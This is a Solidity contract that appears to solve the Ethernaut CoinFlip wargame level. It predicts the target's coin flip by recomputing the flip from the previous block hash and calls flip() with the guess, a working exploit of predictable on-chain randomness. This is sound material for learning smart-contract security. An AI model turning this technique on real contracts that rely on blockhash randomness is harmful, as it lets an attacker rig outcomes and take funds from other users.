// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

import "hardhat/console.sol";

import "./DeployedInstance.sol";

interface IDeployedInstance {
  function flip(bool _guess) external returns (bool);
}

contract EthernautCoinFlip {
    IDeployedInstance public instanceContract;
    uint256 public FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address instanceContractAddress) {
        instanceContract = IDeployedInstance(instanceContractAddress);
    }

    function safeFlip() external returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        bool result = instanceContract.flip(side);

        return result;
    }
}
